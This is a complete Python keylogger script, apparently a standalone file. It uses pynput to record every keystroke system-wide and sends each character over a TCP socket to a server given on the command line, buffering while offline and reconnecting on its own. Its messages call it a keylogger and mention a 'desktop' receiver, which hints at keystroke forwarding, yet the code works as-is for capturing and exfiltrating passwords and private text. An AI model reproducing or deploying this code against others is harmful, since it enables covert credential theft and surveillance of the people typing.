from pynput import keyboard
import socket
import threading
import time
import sys

SERVER_IP = sys.argv[1]
SERVER_PORT = int(sys.argv[2])

class KeySender:
    def __init__(self):
        self.socket = None
        self.connected = False
        self.buffer = []
        self.lock = threading.Lock()
        self.connect()

    def connect(self):
        while not self.connected:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((SERVER_IP, SERVER_PORT))
                self.connected = True
                print("Connected to desktop")
                self.send_buffered()
            except (ConnectionRefusedError, socket.error) as e:
                print(f"Connection failed, retrying in 5 seconds... ({e})")
                time.sleep(5)

    def send(self, text):
        with self.lock:
            if self.connected:
                try:
                    self.socket.sendall(text.encode('utf-8'))
                except (socket.error, OSError) as e:
                    print(f"Send error: {e}")
                    self.connected = False
                    self.reconnect()
            else:
                self.buffer.append(text)

    def send_buffered(self):
        with self.lock:
            while self.buffer:
                text = self.buffer.pop(0)
                try:
                    self.socket.sendall(text.encode('utf-8'))
                except (socket.error, OSError):
                    self.buffer.insert(0, text)
                    self.connected = False
                    self.reconnect()
                    break

    def reconnect(self):
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        threading.Thread(target=self.connect).start()

sender = KeySender()

def on_press(key):
    try:
        # Handle regular characters
        if hasattr(key, 'char') and key.char is not None:
            sender.send(key.char)
        
        # Handle numpad keys
        elif hasattr(key, 'vk') and 96 <= key.vk <= 111:
            numpad_map = {
                96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
                101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
                106: '*', 107: '+', 109: '-', 110: '.', 111: '/'
            }
            if key.vk in numpad_map:
                sender.send(numpad_map[key.vk])
        
        # Handle special keys
        elif key == keyboard.Key.space:
            sender.send(' ')
        elif key == keyboard.Key.enter:
            sender.send('\n')
        elif key == keyboard.Key.tab:
            sender.send('\t')
        elif key == keyboard.Key.backspace:
            sender.send('\x08')  # Proper backspace character

    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nExiting...")
        if sender.socket:
            sender.socket.close()
        return False

print("Starting keylogger. Press ESC to stop.")
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\nUser interrupted")
finally:
    if sender.socket:
        sender.socket.close()